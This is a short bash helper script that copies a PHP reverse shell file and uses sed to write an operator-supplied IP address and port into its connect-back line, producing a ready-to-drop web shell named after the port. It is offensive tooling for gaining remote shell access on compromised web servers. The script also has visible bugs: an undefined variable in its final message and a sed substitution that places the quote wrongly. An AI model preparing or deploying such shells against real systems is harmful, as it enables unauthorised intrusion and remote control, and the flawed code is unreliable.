#!/bin/bash

# Prompt for IP address and port
read -p "Enter new IP address: " ip
read -p "Enter new port: " port

# Define the target PHP file
source_file="/opt/PopScripts/src/php_reverse_shell.php"

# Define the output file name based on the port
output_file="./ivan${port}.php"

# Copy the source file to the current directory
cp "$source_file" "$output_file"

# Use sed to replace the line with the new IP and port
sed -i "s/\(\$sh = new Shell('\)[^']*\('\)/\1$ip',$port\2/" "$output_file"

echo "Updated $target_file with IP: $ip and Port: $port"
